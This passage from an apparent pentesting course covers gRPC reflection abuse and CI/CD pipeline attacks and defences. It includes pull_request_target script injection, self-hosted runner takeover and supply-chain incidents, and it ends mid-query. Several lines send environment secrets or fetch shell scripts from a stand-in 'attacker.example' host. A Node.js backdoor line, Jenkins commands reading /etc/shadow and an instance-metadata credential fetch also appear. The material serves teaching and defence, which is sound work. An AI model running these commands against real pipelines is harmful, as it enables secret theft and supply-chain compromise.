We have skipped the API entirely and pulled a "secret" directly from a service that assumed only its trusted neighbor would ever call it.
17.7 Disable Reflection and Re-Run

Edit backend/main.go and comment out the reflection.Register(s) line, then:
docker compose up -d --build backend

# From the helper container:
grpcurl -plaintext backend:50051 list
# Failed to list services: server does not support the reflection API

# Reflection is off. But if you already know the method names (from a leaked
# .proto, a decompiled client, or a captured packet), you can still call them:
grpcurl -plaintext \
  -proto /tmp/admin.proto \
  -import-path /tmp \
  -d '{}' backend:50051 lab.admin.v1.AdminService.DumpSecret
# {"secret":"sk_live_TOP_SECRET_KEY"}

Takeaway: disabling reflection removes the discovery leak but does not add authorization. A determined attacker with any hint of the schema still calls whatever they want. Reflection is defense-in-depth. Real defense is per-method authorization plus network policy.
18. Exercises
18.1 Guided

    Reflection recon. Using the compose lab from Section 17, write a bash one-liner that lists every service and every method, then invokes every method that takes an empty request. Confirm you can reach DumpSecret without knowing the schema in advance.

    Bypass the front door. Add a Python Flask api service to the compose stack that requires a hardcoded bearer token and forwards to the backend. From the helper container, prove that you can reach the backend directly on :50051 without the token, and document the exact grpcurl invocation used.

    Jaeger topology mining. Deploy Jaeger locally (docker run -d --name jaeger -p 16686:16686 jaegertracing/all-in-one), send five requests through the compose stack instrumented to emit spans, then use only the Jaeger HTTP API (no UI) to list every service, every operation, and every span tag observed.

18.2 Independent

    Kafka PII sniff. Stand up a single-node Kafka in docker-compose. Write a producer that publishes JSON user.signup events containing name, email, and hashed password. From a separate consumer container with no credentials, prove you can subscribe to the topic and enumerate the last 100 messages. Then apply SASL/SCRAM and repeat to confirm the fix.

    Istio permissive escape. Using minikube start --driver=docker and istioctl install --set profile=demo, deploy a two-service app. Set the mesh PeerAuthentication to PERMISSIVE. From a pod outside the mesh (no sidecar), reach the service in plaintext. Then switch to STRICT and confirm the plaintext call is refused.

    Actuator heapdump loot. Deploy a vulnerable Spring Boot 2.x application with the Actuator endpoints exposed (many are on GitHub for training). Pull /actuator/heapdump, extract strings, and enumerate every credential-like value. Write a short report identifying which secrets are real and which are noise.

19. Summary and Next-Lesson Pointer

Microservices did not create new vulnerability classes so much as they redistributed responsibility. The attacker's job is now to map that distribution: which service holds which secret, which service the gateway actually protects (and which it does not), which method the mesh policy allows, which topic leaks PII.

Key takeaways from this lesson:

    The service graph is your real target. Start by mapping it — DNS, tracing UI, service registry, reflection.
    Gateways only protect what must go through them. Internal Service DNS names routinely bypass every gateway control.
    Service meshes provide mTLS and policy, but PERMISSIVE mode and misconfigured sidecars break the model. Control-plane debug endpoints are jackpots.
    gRPC reflection is a debugging feature that leaks the entire API surface when left on. Disable it in production and never rely on it as a security boundary.
    GraphQL introspection, per-field authz gaps, and batching turn a single endpoint into a large attack surface.
    Message queues carry PII in cleartext and often have no authn. If you can reach the broker, you can read the business.
    Observability infrastructure (Jaeger, Prometheus, Grafana, OTel collectors) is chronically under-authenticated and reveals the topology attackers most want to see.

The next lesson, Module 04 — Lesson 06: Kubernetes Security From an Attacker's Perspective, builds on this by focusing on the substrate that runs almost every modern microservices deployment: the Kubernetes cluster itself. We will cover pod escape paths, service account token abuse, RBAC enumeration, admission-controller bypasses, and the specific CVEs that turn a compromised container into a compromised node into a compromised cluster.




























Lesson 06 — CI/CD Pipeline Security

    Module 04: Containers and Software Architecture · Penetration Testing with Kali Linux 1.0 · Red Team Leaders

Introduction

Continuous Integration and Continuous Delivery pipelines are the beating heart of modern software delivery. Every push to a repository triggers a runner somewhere that clones code, installs dependencies, builds artifacts, runs tests, signs releases, and pushes to production. That runner has credentials — cloud keys, registry tokens, SSH keys, database passwords — and it runs as some form of privileged principal on every code change. Compromise that runner, or the workflow definition it consumes, and you own not only the current repository but every downstream system that trusts its output.

CI/CD pipelines are attractive to attackers for three reasons. First, they are automated: a single malicious commit can execute across dozens of runners in minutes with no human review. Second, they hold secrets by design — the entire purpose of a build system is to have credentials for the systems it deploys to. Third, their output is trusted implicitly by downstream consumers: a package built by your pipeline and pushed to your registry is installed by thousands of servers without further inspection. The SolarWinds Orion compromise (2020), the Codecov Bash Uploader breach (CVE-2021-32471), the PyTorch nightly dependency confusion (2022), and the tj-actions/changed-files rewrite (CVE-2025-30066) all rely on this trust asymmetry.

This lesson dissects CI/CD pipelines from a pentester's perspective. We will walk workflows step by step, show where secrets accumulate, exploit the classic pull_request_target script injection against a lab repository, hijack a self-hosted runner, and pivot from a leaked GITHUB_TOKEN to a poisoned main branch. We will look at GitLab CI, Jenkins Groovy, and the smaller SaaS runners, then finish with the defensive stack — signed commits, SBOMs, in-toto attestations, and cosign — that raises the cost of these attacks.
1. Introduction — Runners Run as Admin Somewhere

The single most important mental model for CI/CD security is this: every pipeline job is code execution on infrastructure that already has privilege. The runner may be a container in GitHub's fleet, an EC2 instance in your VPC, a bare-metal server in a colocation rack, or a laptop under someone's desk. Wherever it lives, it holds two categories of privilege:

    Ambient privilege — network reachability, instance metadata access, IAM role attached to the host, ability to write to shared filesystems or caches.
    Injected privilege — secrets bound into the job environment: registry credentials, cloud keys, GITHUB_TOKEN, deployment SSH keys, code-signing certificates.

If a workflow is defined in a file inside the repository, then whoever can modify that file can execute arbitrary code with both categories of privilege. The whole game becomes: who can modify the workflow, or supply the input that the workflow interpolates unsafely into a shell?
┌───────────────────────────────────────────────────────────┐
│  Attacker goal                                            │
├───────────────────────────────────────────────────────────┤
│  1. Get code execution on a runner                        │
│  2. Steal ambient credentials (IMDS, mounted secrets)     │
│  3. Exfiltrate injected secrets from env                  │
│  4. Poison an artifact downstream consumers will pull     │
│  5. Persist by modifying protected branches or writing    │
│     new workflows                                         │
└───────────────────────────────────────────────────────────┘

Each of the sections below is a variation on the same attack tree.
2. Pipeline Anatomy — Where Secrets Live at Each Step

A CI/CD pipeline is a graph of jobs, but at a coarse level every pipeline moves through the same phases. Understanding which credentials appear at which phase tells you where to hunt.
2.1 The Six-Phase Pipeline
┌────────┐   ┌───────┐   ┌──────┐   ┌─────────┐   ┌─────────┐   ┌────────┐
│ Source │ → │ Build │ → │ Test │ → │ Package │ → │ Publish │ → │ Deploy │
└────────┘   └───────┘   └──────┘   └─────────┘   └─────────┘   └────────┘
   Git         Compile     Unit,     Container,     Registry     SSH,
   token       cache       integ,    tarball,       push,        kubectl,
   SSH         proxy       fuzz      SBOM           sign         Helm,
   deploy      creds                                 keys         cloud IAM
   key
2.2 Secrets by Phase
Phase	Typical secrets	Where they leak
Source	Git PAT, deploy key, SSH agent socket	git config --get, .git/config, agent forwarding
Build	Package proxy creds (Artifactory, Nexus), private registry auth	~/.npmrc, ~/.pip/pip.conf, ~/.m2/settings.xml, build logs
Test	Test DB URLs, staging API keys, seeded fixtures	Test output, JUnit XML, coverage reports uploaded as artifacts
Package	GPG signing keys, cosign private keys, codesign certificates	Ephemeral files in /tmp, ~/.gnupg, keychain unlock
Publish	Registry push tokens, npm auth, PyPI API token, Docker Hub PAT	Env vars, ~/.docker/config.json, workflow logs on failure
Deploy	Cloud IAM (AWS access key, GCP service account JSON, Azure SP), kubeconfig, Helm chart repo creds	Env vars, mounted files, kubectl config, cloud provider CLIs
2.3 Common Anti-Patterns

    Passing secrets as command-line arguments (visible in ps and process logs).
    echo $SECRET for debugging (masking is best-effort; base64 defeats it trivially).
    Uploading .env files as build artifacts.
    Persisting the runner workspace across jobs so leftover credentials survive.
    Using the same broadly-scoped cloud role for build and deploy.

3. GitHub Actions in Depth

GitHub Actions has become the dominant CI/CD system for open source and is heavily used inside enterprises via GitHub Enterprise Server. Its power — and its risk surface — comes from an expression language that is interpolated into shell scripts before execution.
3.1 Workflow Syntax

Workflows live under .github/workflows/*.yml. A minimal workflow:
name: CI
on:
  push:
    branches: [main]
  pull_request:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Install
        run: npm ci
      - name: Test
        run: npm test
3.2 Triggers That Matter for Security
Trigger	Runs on fork PRs?	Has secrets?	Uses fork code?
push	No	Yes	N/A
pull_request	Yes	No (read-only token)	Yes
pull_request_target	Yes	Yes (full secrets)	Runs base repo code, but event context is fork-controlled
workflow_run	After another workflow	Yes	Careful — can inherit fork inputs
issue_comment	Yes	Yes	Comment body is attacker-controlled
workflow_dispatch	Manual	Yes	Inputs from caller

The pull_request_target trigger is the most dangerous by design. It exists so that maintainers can label PRs, run first-time-contributor checks, and add comments — actions that need write access to the base repository. But because it grants secrets to a workflow processing fork-controlled inputs, it is the origin of the most productive class of Actions vulnerabilities.
3.3 Runners: GitHub-Hosted vs Self-Hosted

    GitHub-hosted runners are ephemeral VMs. Each job gets a clean environment; the VM is destroyed after the job. Compromise ends with the job.
    Self-hosted runners are long-lived. The runner service polls GitHub for jobs and executes them on your infrastructure. Compromise means persistent access to your network. GitHub's own documentation warns against attaching self-hosted runners to public repositories.

3.4 Expression Contexts

Actions expressions look like ${{ <context>.<field> }}. They are evaluated before the shell sees them — the string is substituted verbatim into the run: script.
- name: Say hello
  run: echo "Hello ${{ github.event.pull_request.title }}"

If the PR title is foo"; curl attacker.com | sh; #, the runner executes:
echo "Hello foo"; curl attacker.com | sh; #"

This is script injection, and it is the single most common Actions vulnerability class. GitHub's Security Lab has published dozens of writeups; the pattern remains prevalent as of 2026.
3.5 GITHUB_TOKEN and Permissions

Every workflow run receives an ephemeral GITHUB_TOKEN scoped to the repository. Prior to 2023, it defaulted to full write access on many repositories. Modern defaults are read-only, but many older workflows still declare broader scopes:
permissions:
  contents: write
  packages: write
  id-token: write

The id-token: write scope is significant — it enables OIDC exchange with cloud providers, meaning the workflow can mint short-lived AWS/GCP/Azure credentials without any long-lived secret being stored. Compromise a workflow with id-token: write and a trust policy that accepts it, and you get cloud credentials on demand.
4. Attack — pull_request_target Script Injection

This is the canonical CI/CD attack. It works on any workflow that combines three ingredients:

    on: pull_request_target (or workflow_run chained after pull_request).
    A run: step that interpolates a fork-controlled expression (github.event.pull_request.title, github.head_ref, github.event.pull_request.body, PR label names, review comment bodies).
    Secrets or a write-scoped token in scope.

4.1 Vulnerable Workflow
name: PR Greeter
on:
  pull_request_target:
    types: [opened]

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - name: Post greeting
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          echo "Welcome, thanks for the PR titled: ${{ github.event.pull_request.title }}"
          gh api "/repos/${{ github.repository }}/issues/${{ github.event.pull_request.number }}/comments" \
            -f body="Thanks for your PR!"
4.2 Exploit

The attacker forks the repository and opens a PR with the title:
Fix typo"; curl -sfL https://attacker.example/x | bash; echo "

The rendered script becomes:
echo "Welcome, thanks for the PR titled: Fix typo"; curl -sfL https://attacker.example/x | bash; echo ""
gh api ...

The curl | bash runs with the job environment, which includes GH_TOKEN. The payload does:
#!/bin/sh
env | base64 -w0 | curl -X POST --data-binary @- https://attacker.example/exfil

Real-world examples matching this pattern include the GitHub Security Lab writeup on tj-actions/changed-files (CVE-2025-30066, March 2025) where the compromised action pushed a malicious step into every workflow that used it, and the 2022 writeup by Adnan Khan on Chrome for Testing.
4.3 Detection in the Wild
# Grep a cloned org for the pattern:
grep -rE 'pull_request_target|workflow_run' .github/workflows/
grep -rE '\$\{\{\s*github\.event\.(pull_request\.(title|body|head\.ref)|issue\.title|comment\.body)\s*\}\}' \
     .github/workflows/

Tools like zizmor and actionlint catch the pattern statically.
5. Attack — Self-Hosted Runner Takeover

A self-hosted runner attached to a public repository is a standing invitation. Anyone who can open a PR can execute code on it. Even for private repositories, a compromised contributor or a repository with lax branch protection provides the same primitive.
5.1 The Attack

The target repository has:
on: [pull_request]
jobs:
  build:
    runs-on: [self-hosted, linux, x64]
    steps:
      - uses: actions/checkout@v4
      - run: make test

An attacker forks and modifies Makefile:
test:
	@curl -sfL https://attacker.example/rev.sh | sh

They open a PR. If the repository maintainers merge or if pull_request (not _target) is used with a self-hosted runner, the malicious make test runs on the maintainer's infrastructure. From there:

    Read _work/_temp/_runner_file_commands/ for other jobs' inputs.
    Enumerate the runner's .credentials and .runner JSON to find the registration token.
    Persist via cron, systemd unit, or .bashrc on the runner account.
    Pivot to instance metadata: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/.
    Wait for another job — perhaps a deploy job on main — and steal its secrets from /proc/<pid>/environ.

5.2 GitHub's Recommendations vs Reality

GitHub explicitly recommends against self-hosted runners on public repos. In practice, thousands of organizations do exactly that. The 2023 Praetorian research on GitHub Actions runners documented widespread exposure across large open-source projects. In 2024, Adnan Khan's Gato-X scanner catalogued hundreds of self-hosted runner takeovers in public repositories.
5.3 Hardening Self-Hosted Runners

    Use ephemeral runners (--ephemeral flag) so each job gets a fresh registration and the runner de-registers after one job.
    Run the runner inside an unprivileged container with no host socket, no privileged flag, and a dedicated network namespace.
    Attach the runner at the repository level only, never organization-wide with pooled access.
    Enforce Require approval for all outside collaborators and disallow first-time contributors from triggering workflows.
    Use runner groups scoped to specific repositories.

6. Attack — Leaked GITHUB_TOKEN with contents: write

Any injection or logic bug that lets an attacker exfiltrate the job's GITHUB_TOKEN is a serious event. If the token has contents: write, the attacker can rewrite the repository — including protected branches, subject to branch protection settings that many repos leave permissive.
6.1 What the Token Allows

With contents: write on GITHUB_TOKEN:
# Clone using the token
git clone https://x-access-token:$GITHUB_TOKEN@github.com/victim/repo.git
cd repo

# Add a backdoor to a widely-included file
cat >> src/index.js <<'EOF'
try{require('child_process').exec('curl -s https://attacker.example/i?h='+require('os').hostname())}catch(e){}
EOF

git -c user.email=bot@victim -c user.name=bot commit -am "chore: update deps"
git push origin HEAD:main

If branch protection requires signed commits or PR review, direct push to main fails. But the token can:

    Create a new branch and open a PR (bypassing requirement of a human author on the commit).
    Push a new tag that release automation trusts.
    Create a release, uploading a poisoned binary.
    Modify .github/workflows/*.yml to disable protections on the next run.

6.2 Real-World Cases

    CVE-2025-30066 (tj-actions/changed-files) — an attacker compromised the action's release tags and rewrote history to inject a payload that dumped process memory (containing GITHUB_TOKEN and other secrets) to workflow logs. Tens of thousands of downstream workflows leaked secrets in a matter of hours.
    CVE-2024-27351 / GHSA-6phf-73q6-gh87 and related workflow injection advisories affecting popular actions across 2024.
    Codecov Bash Uploader (April 2021) — attacker altered the uploader script; every CI that piped it to bash leaked env vars, including CI system tokens.

6.3 Defense
permissions:
  contents: read      # deny writes at the top of the workflow
  pull-requests: write  # grant only what you need per job

Set repository default to read-only under Settings -> Actions -> General -> Workflow permissions.
7. GitLab CI

GitLab CI is defined in .gitlab-ci.yml at the repository root. The runner model is similar in structure, but the security primitives differ.
7.1 Minimal Pipeline
stages:
  - build
  - test
  - deploy

variables:
  DOCKER_DRIVER: overlay2

build:
  stage: build
  image: node:20-alpine
  script:
    - npm ci
    - npm run build
  artifacts:
    paths:
      - dist/

test:
  stage: test
  image: node:20-alpine
  needs: [build]
  script:
    - npm test

deploy_prod:
  stage: deploy
  image: alpine:3.19
  needs: [test]
  only:
    - main
  script:
    - apk add --no-cache curl
    - curl -H "Authorization: Bearer $DEPLOY_TOKEN" -X POST https://deploy.example/hook
  environment:
    name: production
7.2 CI_JOB_TOKEN and Protected Variables

Every GitLab CI job receives CI_JOB_TOKEN. Historically it was almost useless; since GitLab 15+ it can be scoped to grant read/write to specific projects. Misconfiguration here is the GitLab analog of GITHUB_TOKEN scope creep.

Variables can be marked Protected (only exposed on protected branches/tags) and Masked (redacted in job logs). Both must be set explicitly.
7.3 Runners

    Shared runners on gitlab.com run in ephemeral VMs.
    Group runners attach to a group and are reused across many projects — a compromise of one project's job can attack the runner state and affect neighbors.
    Specific runners attach to one project.

Docker-in-Docker runners with privileged = true are a common misconfiguration. A malicious .gitlab-ci.yml job can break out of the container.
7.4 Attack Surface Specific to GitLab

    include: remote — a .gitlab-ci.yml that includes YAML from a remote URL executes whatever that URL currently serves.
    Merge request pipelines (workflow: rules: - if: '$CI_MERGE_REQUEST_ID') may run fork code with parent-project variables if branch protection is misconfigured.
    Auto DevOps — the built-in pipeline template ships with a wide default permission set.

8. Jenkins

Jenkins remains the most widely deployed on-prem CI system and is a perennial target. Its architecture — a controller with agents, plugin-driven execution, and a Groovy-scripted pipeline language — offers many primitives for RCE.
8.1 Classic (Freestyle) vs Pipeline

Freestyle jobs are configured through the UI, storing shell blocks and SCM configurations. Pipeline jobs are code, either in a Jenkinsfile in the repository or a Groovy script in job config.
pipeline {
  agent { label 'linux' }
  stages {
    stage('Build') {
      steps {
        sh 'make build'
      }
    }
    stage('Deploy') {
      when { branch 'main' }
      steps {
        withCredentials([string(credentialsId: 'prod-key', variable: 'PROD_KEY')]) {
          sh 'deploy.sh $PROD_KEY'
        }
      }
    }
  }
}
8.2 Script Console — Trivial RCE

http://<jenkins>/script is the Groovy script console. Anyone with Overall/Administer — or with a token that has it — can execute arbitrary Groovy in the controller JVM:
"id".execute().text
new File("/etc/shadow").text
Jenkins.instance.getAllItems().each { println it.name }

The historic mass compromise of Jenkins servers exposed to the internet was overwhelmingly via unauthenticated or weak-auth access to /script, /manage, /scriptText, and /computer/(built-in)/api/.
8.3 Notable CVEs

    CVE-2024-23897 — Jenkins CLI arbitrary file read via expandAtFiles. Reading secrets/master.key and secrets/hudson.util.Secret lets an attacker decrypt every stored credential.
    CVE-2018-1000861 — pre-auth RCE via Stapler/Groovy metaprogramming.
    CVE-2017-1000353 — deserialization RCE in the CLI.

8.4 Groovy Sandbox Escapes

The Script Security plugin sandboxes untrusted Groovy in Jenkinsfiles. Historically, dozens of sandbox escapes have been reported (CVE-2019-1003029, -1003030, and many SECURITY-* advisories). A pattern:
// This was a historical sandbox escape via metaprogramming
this.class.classLoader.loadClass('Runtime').getRuntime().exec('id')

Every escape requires an admin to have approved a script or a misconfigured sandbox. In an assessment, always check Manage Jenkins -> In-process Script Approval for pending or historically-approved dangerous signatures.
9. CircleCI, Buildkite, Drone — Brief Mention

    CircleCI — .circleci/config.yml, contexts hold shared secrets, orbs are reusable YAML fragments (an orb takeover mirrors a GitHub Action takeover). CircleCI itself was breached in December 2022 when a customer support engineer's laptop was compromised, leaking customer environment variables and tokens.
    Buildkite — hybrid model where Buildkite hosts the coordination plane but agents run in customer infrastructure. The agent's hooks/ directory is a persistence primitive; if you can write to it, every subsequent job runs your hook.
    Drone / Woodpecker — YAML-defined, container-native. Trusted repositories bypass the security sandbox and grant --privileged to job containers — a misplaced trusted: true in the repo settings is instant host takeover.

The common thread: read the CI's own security model documentation before assessing. Each has one or two specific "if you set this flag, security is off" toggles.
10. Supply Chain Attacks on Dependencies

The runner is not the only attack surface. Every dependency the build pulls is potentially attacker-controlled.
10.1 Dependency Confusion

Alex Birsan's 2021 research demonstrated that many organizations configure package managers to fall back to public registries when private ones do not contain a requested name. Publishing a public package with the same name as an internal one causes the build to fetch the attacker's version.
# The victim uses an internal package "internal-utils"
# Attacker publishes internal-utils to npmjs.com with higher version
npm publish   # from attacker's package.json declaring version 99.0.0

# Victim's build runs `npm install` and pulls the public 99.0.0
# because the internal registry only has 1.2.3

Mitigation: scoped packages, explicit .npmrc/.pip.conf that pins registry per scope, deny public fallback.
10.2 Typosquatting

Publishing reqeusts, python-sqlite, colorss, lodahs and hoping developers fat-finger. Sonatype and Snyk both publish quarterly reports; hundreds of malicious typosquats are removed from npm and PyPI every month.
10.3 Malicious Updates to Legitimate Packages

    event-stream (2018) — a maintainer handed over the package to a new "helper," who added flatmap-stream as a dependency. The dependency stole Bitcoin wallet keys from Copay users. Estimated millions of downloads before removal.
    ua-parser-js (October 2021) — CVE-2021-42740 and the associated NPM security advisory. A hijacked maintainer account published versions 0.7.29, 0.8.0, 1.0.0 with a coin miner and credential stealer targeting Windows and Linux.
    colors.js and faker.js (January 2022) — the maintainer intentionally sabotaged his own packages with an infinite loop, breaking thousands of downstream builds.
    xz-utils (CVE-2024-3094, March 2024) — a multi-year social engineering campaign inserted a backdoor into the compression library, which was picked up by Linux distributions and would have shipped to production if not for Andres Freund's chance discovery.
    PyTorch nightly (December 2022) — dependency confusion on the torchtriton package, published maliciously to PyPI while PyTorch nightly pulled from PyPI by default.

10.4 Defense

    Lockfiles (package-lock.json, poetry.lock, Cargo.lock) with integrity hashes.
    Private mirrors (Artifactory, Nexus, Verdaccio) that vet publications.
    Allow-lists of approved packages.
    Automated scanning: Socket, Snyk, Sonatype, npm audit, pip-audit.

11. SolarWinds-Class Attacks — Poisoned Build Servers

The SolarWinds Orion compromise (public disclosure December 2020, tracked as SUNBURST/UNC2452) is the canonical modern supply-chain attack. The build server was compromised; malicious code was silently inserted during compilation; the resulting artifact was signed with the legitimate SolarWinds code-signing certificate and shipped to ~18,000 customers.
11.1 The Attack Pattern
1. Attacker compromises developer or build-agent credentials.
2. Attacker plants a malicious build-time hook (compiler plugin,
   pre-build script, "helper" tool called during MSBuild).
3. Legitimate developers commit legitimate source code.
4. Build server compiles source. The hook injects malicious
   objects into the output at link time.
5. Build server signs the artifact with the real signing key.
6. The artifact is indistinguishable from legitimate output at
   the source level — the malicious code exists only after linking.
7. Downstream consumers install and trust the signed artifact.

The critical insight is that reviewing source code does not detect this. You must audit the build environment itself and verify reproducibility.
11.2 Detection and Defense

    Reproducible builds — the same source input always produces byte-identical output. Any drift is a red flag. Debian's Reproducible Builds project has pushed this since 2013.
    Hermetic builds — no network access during build; all inputs materialized in advance. Bazel and Nix enforce this.
    Two-person build attestation — two independent builders must produce the same artifact hash before signing.
    Build environment isolation — the signing key never touches the general-purpose build environment. A separate signer receives the artifact hash and returns a signature.

11.3 Comparable Incidents

    CCleaner (2017) — Piriform build server compromised; two malicious versions shipped to over 2 million users.
    NotPetya (2017) — M.E.Doc Ukrainian accounting software update server was hijacked to distribute the wiper.
    3CX (March 2023) — cascaded supply chain: Trading Technologies X_TRADER (retired product) compromise led to a compromised 3CX developer, which led to malicious 3CX Desktop App updates.

12. Container Image Supply Chain

Pulling docker.io/library/nginx:latest in your Dockerfile is trust in whoever controls that tag now and in the future. Tags are mutable; digests are not.
12.1 The Trust Chain
FROM node:20-alpine

This trusts:

    Docker Hub's registry infrastructure.
    The current value of the node:20-alpine tag (which changes over time).
    The Node.js Docker maintainers' pipeline that publishes it.
    The Alpine maintainers' base image.
    Every layer's binaries.

12.2 Pinning to Digests
FROM node:20-alpine@sha256:2d07db07a2df6830718ae2a47db6fedce6745f5bcd174c398f2acdda90a01c00

The digest is content-addressed. If the image behind the tag is republished maliciously, the pin still resolves to the original bytes.
12.3 Image Signing with Cosign

Sigstore's cosign signs OCI artifacts using either static keys or short-lived OIDC-derived Fulcio certificates:
# Keyless sign using the GitHub Actions OIDC identity
cosign sign --yes ghcr.io/example/app@sha256:abc...

# Verify
cosign verify \
  --certificate-identity 'https://github.com/example/app/.github/workflows/release.yml@refs/tags/v1.2.3' \
  --certificate-oidc-issuer 'https://token.actions.githubusercontent.com' \
  ghcr.io/example/app@sha256:abc...

Deployment tooling (Kyverno, Sigstore Policy Controller, Connaisseur) can enforce that only images signed by a trusted identity are admitted to the cluster.
12.4 SLSA Levels

The Supply-chain Levels for Software Artifacts framework (SLSA, pronounced "salsa") defines four levels of build integrity. As of SLSA v1.0:

    Build L1 — provenance exists and describes how the artifact was built.
    Build L2 — provenance is generated by a hosted build platform, digitally signed.
    Build L3 — the build platform hardens against tampering, isolates builds, and prevents secret exfiltration.

GitHub Actions with slsa-framework/slsa-github-generator reaches L3 for many workflow shapes.
13. Secret Management

The wrong secret pattern is: check secrets into env files, encrypt at rest with a shared team key, decrypt into environment variables at job start. The right pattern is: fetch short-lived secrets at use, log nothing, rotate frequently.
13.1 Managed Secret Stores

    HashiCorp Vault — supports dynamic secrets (per-request database credentials that expire in minutes), transit encryption, PKI issuance. Auth methods include AppRole, JWT (for CI OIDC), and cloud IAM.
    AWS Secrets Manager / SSM Parameter Store — retrieve via IAM role. Combine with GitHub Actions OIDC federation to avoid any long-lived AWS key.
    GCP Secret Manager, Azure Key Vault — analogous.
    GitHub Actions Secrets — encrypted at rest, decrypted into job env. Suitable for tokens that authenticate to another secret store, not for long-lived crown-jewel secrets.
    Doppler, Infisical, 1Password Secrets Automation — third-party SaaS.

13.2 GitHub Actions Secret Access
- name: Deploy
  env:
    API_KEY: ${{ secrets.PROD_API_KEY }}
  run: ./deploy.sh

Access rules:

    Secrets are not passed to workflows triggered from forks (a pull_request from a fork sees empty values).
    Secrets are masked in logs — masking is a substring replace, defeated by any transformation.
    Environment-scoped secrets (environments/prod) can require reviewer approval before the job runs.

13.3 Leak Paths
# BAD: echoing a secret. GitHub's masker may replace it,
# but base64 or reversed strings bypass masking.
- run: echo "$PROD_API_KEY" | base64

# BAD: set -x prints every command with expanded variables
- run: |
    set -x
    curl -H "Authorization: Bearer $TOKEN" ...

# BAD: writing secrets into artifacts
- run: env > env.txt
- uses: actions/upload-artifact@v4
  with:
    path: env.txt

# BAD: passing on command line — visible in ps and audit logs
- run: mytool --api-key=$API_KEY
13.4 Preferred Patterns

    Use OIDC federation for cloud access (aws-actions/configure-aws-credentials with role-to-assume and id-token: write).
    Prefer file-based secret injection (--credential-file) over env vars.
    Use add-mask:: to mask any dynamically-computed sensitive values.
    Rotate on a schedule and on every suspected exposure.

14. Secret Scanning Tooling

Scanning history and current code for secrets is table stakes. Assume every repo you touch has leaked secrets in history until proven otherwise.
14.1 gitleaks
# Scan the current working tree
gitleaks detect --source . --verbose

# Scan the entire git history
gitleaks detect --source . --log-opts="--all"

# Scan a specific commit range
gitleaks detect --source . --log-opts="main..feature-branch"

# Custom rules
gitleaks detect --config .gitleaks.toml
14.2 trufflehog
# Scan a GitHub org, verifying secrets against live APIs
trufflehog github --org=victim --only-verified

# Scan a repo's full history
trufflehog git file://. --only-verified

# Scan a Docker image's layers
trufflehog docker --image=nginx:latest

Trufflehog's differentiator is verification — it will attempt to use each detected secret against the corresponding API to confirm it is live. This dramatically reduces false positives.
14.3 GitHub Secret Scanning

GitHub natively scans public repos and, for GitHub Advanced Security customers, private repos. Partner-integrated scanners immediately notify the token issuer (AWS, Stripe, Slack, etc.), who may auto-revoke.
14.4 Others

    detect-secrets (Yelp) — baseline-driven, good for CI gating.
    git-secrets (AWS Labs) — pre-commit hook.
    Cloudflare's git-secret — different project, encrypts secrets with GPG for storage in git.
    Nosey Parker (Praetorian) — high-performance scanner tuned for large codebases.

14.5 Rotation After a Leak

A leaked secret is compromised even if no exploitation is observed. Rotate immediately. Cleaning history via git filter-repo does not help if the commit was ever pushed — public mirrors, forks, and clones may retain it.
15. SBOM and Provenance

A Software Bill of Materials (SBOM) is a machine-readable list of everything in an artifact: direct dependencies, transitive dependencies, versions, licenses, hashes.
15.1 Generating SBOMs with syft
# Generate SPDX JSON from a container image
syft ghcr.io/example/app:1.2.3 -o spdx-json > sbom.spdx.json

# Generate CycloneDX from a source directory
syft dir:. -o cyclonedx-json > sbom.cdx.json

# Attach to an image as an OCI referrer
syft ghcr.io/example/app:1.2.3 -o cyclonedx-json | \
  cosign attest --predicate - --type cyclonedx ghcr.io/example/app@sha256:...
15.2 Vulnerability Scanning from an SBOM
grype sbom:./sbom.spdx.json
# Or scan the image directly
grype ghcr.io/example/app:1.2.3
15.3 In-Toto Attestations

in-toto is a framework for tracking the steps of a build pipeline, each attested by the entity performing it:
# Attest that this artifact was built by this workflow from this commit
cosign attest --predicate provenance.json \
  --type slsaprovenance \
  ghcr.io/example/app@sha256:...

slsa-github-generator produces SLSA-compliant provenance automatically.
15.4 Verifying at Deploy Time
cosign verify-attestation \
  --type slsaprovenance \
  --certificate-identity-regexp '^https://github.com/example/app/' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  ghcr.io/example/app@sha256:...
16. Signed Commits and Signed Tags

Commit signing does not prevent malicious code from being committed. It proves who committed it — which matters for accountability and for revoking trust after a compromise.
16.1 GPG-Signed Commits
# Configure
git config --global user.signingkey <keyid>
git config --global commit.gpgsign true
git config --global tag.gpgsign true

# Sign a specific commit
git commit -S -m "feat: signed commit"

# Verify
git log --show-signature
16.2 SSH-Signed Commits

Since Git 2.34, SSH keys can sign commits:
git config --global gpg.format ssh
git config --global user.signingkey ~/.ssh/id_ed25519.pub
git config --global commit.gpgsign true
16.3 sigstore/gitsign — Keyless Signing

gitsign uses Sigstore's Fulcio to issue an ephemeral certificate tied to your OIDC identity (Google, GitHub, Microsoft). No long-lived key to manage or leak:
git config --global gpg.x509.program gitsign
git config --global gpg.format x509
git config --global commit.gpgsign true

git commit -am "chore: gitsign commit"
gitsign verify HEAD --certificate-identity=me@example.com --certificate-oidc-issuer=https://accounts.google.com
16.4 Branch Protection with Required Signatures

On GitHub, enable Require signed commits on the branch protection rule. Any push containing an unsigned or invalidly-signed commit is rejected.
17. Detection

Every CI/CD platform records what it does. Turning that data into signal requires baselines and integrations.
17.1 GitHub Audit Log

Available at the organization level for Business and Enterprise plans. Ships to Splunk/Datadog/etc. via streaming. High-signal events:

    workflow_run.completed with non-standard runners.
    repo.actions_enabled and repo.self_hosted_runner_online.
    personal_access_token.access_granted.
    oauth_application.transfer and integration_installation.repositories_added.
    protected_branch.destroy and repo.change_merge_setting.

17.2 GitHub Actions Job Summaries and Attestation

Every job publishes a summary and, if the workflow uses attest-build-provenance, a signed attestation:
- uses: actions/attest-build-provenance@v1
  with:
    subject-path: dist/app
17.3 GitLab Audit Events

Admin Area -> Monitoring -> Audit Events. Streamable via webhook to a SIEM. Key events: pipeline creation on protected branches, CI variable changes, runner registration, project transfers.
17.4 Jenkins

Enable the audit-trail plugin and stream to syslog. Watch for /script, /scriptText, /manage, and job configuration changes. Correlate with agent process listings via osquery.
17.5 Threat Hunting Queries
# GitHub: find workflows that use dangerous triggers
gh api graphql -f query='
  query {
    organization(login:"victim") {
      repositories(first: 100) {
        nodes {
          nameWithOwner
          object(expression: "HEAD:.github/workflows") {
            ... on Tree { entries { name } }
          }
        }
